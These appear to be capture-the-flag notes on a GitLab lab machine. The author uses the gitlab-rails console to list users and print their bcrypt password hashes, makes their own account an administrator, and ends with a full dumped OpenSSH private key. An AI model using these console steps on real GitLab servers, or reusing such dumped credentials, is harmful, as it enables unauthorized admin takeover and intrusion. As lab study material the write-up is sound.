# Shell as git -

```bash
git@git:~/gitlab-rails/working$ whoami
git
```


# Start the gitlab Console-

```bash
git@git:~/gitlab-rails/working$ gitlab-rails console                                                                                                          
--------------------------------------------------------------------------------                                                                              
 GitLab:       12.8.1 (d18b43a5f5a) FOSS                                                                                                                      
 GitLab Shell: 11.0.0                                                                                                                                         
 PostgreSQL:   10.12                                                                                                                                          
--------------------------------------------------------------------------------                                                                              
Loading production environment (Rails 6.0.2)                                                                                                                  
irb(main):001:0>
```

## Enumerating Users and Admins-

```bash
irb(main):001:0> User.active                                                                                                                                  
=> #<ActiveRecord::Relation [#<User id:6 @test1234>, #<User id:4 @seven>, #<User id:1 @dexter>, #<User id:5 @foo>]>                                           
irb(main):002:0> User.admins                                                                                                                                  
=> #<ActiveRecord::Relation [#<User id:1 @dexter>]>
```
## To Display more Info-

```bash
irb(main):011:0> u=User.find(1)
=> #<User id:1 @dexter>
irb(main):012:0> pp u.attributes
{"id"=>1,
 "email"=>"admin@example.com",
 "encrypted_password"=>
  "$2a$10$YqNpT9IdQm9tlE3SS/uYWOsrH1Fblb/jiM62XVB.WzDLTJNoC0/im",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>8,
 "current_sign_in_at"=>Tue, 20 Oct 2020 18:39:24 UTC +00:00,
 "last_sign_in_at"=>Fri, 28 Aug 2020 15:15:09 UTC +00:00,
 "current_sign_in_ip"=>"172.17.0.1",
 "last_sign_in_ip"=>"172.17.0.1",
 "created_at"=>Thu, 02 Jul 2020 18:02:18 UTC +00:00,
 "updated_at"=>Tue, 20 Oct 2020 18:39:24 UTC +00:00,
 "name"=>"Dexter McPherson",
 "admin"=>true,
<snip>
```

* **We can see dexter is admin**

## Finding our created user-

```bash
irb(main):019:0> u=User.find(7)                                                                                                                      [172/351]
=> #<User id:7 @napster>
irb(main):020:0> pp u.attributes                                                
{"id"=>7,
 "email"=>"napster2019@laboratory.htb", 
 "encrypted_password"=>
  "$2a$10$ZgWVTnUd4aGwvPcN6cE92euu1WWJCl0QkDCYU8n5CkPDeHCOBLe.C",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>1,
 "current_sign_in_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "last_sign_in_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "current_sign_in_ip"=>"172.17.0.1",
 "last_sign_in_ip"=>"172.17.0.1",
 "created_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "updated_at"=>Tue, 27 Apr 2021 12:58:11 UTC +00:00,
 "name"=>"napster",
 "admin"=>false,
```

## Giving admin privileges to ourself-

```bash
irb(main):021:0> u.admin = true                                                                                                                       [67/351]
=> true
irb(main):022:0> u.save!
=> true
irb(main):023:0> pp u.attributes
{"avatar"=>nil,
 "projects_limit"=>10,
 "id"=>7,
 "username"=>"napster",
 "email"=>"napster2019@laboratory.htb", 
 "encrypted_password"=>
  "$2a$10$ZgWVTnUd4aGwvPcN6cE92euu1WWJCl0QkDCYU8n5CkPDeHCOBLe.C",
 "reset_password_token"=>nil,
 "reset_password_sent_at"=>nil,
 "remember_created_at"=>nil,
 "sign_in_count"=>1,
 "current_sign_in_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "last_sign_in_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "current_sign_in_ip"=>"172.17.0.1",
 "last_sign_in_ip"=>"172.17.0.1",
 "created_at"=>Tue, 27 Apr 2021 12:58:10 UTC +00:00,
 "updated_at"=>Tue, 27 Apr 2021 13:00:50 UTC +00:00,
 "name"=>"napster",
 "admin"=>true,
```


## Logged in as admin was able to recover private ssh key of dexter-

![[Pasted image 20210427101011.png]]

## SSH-KEY
```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```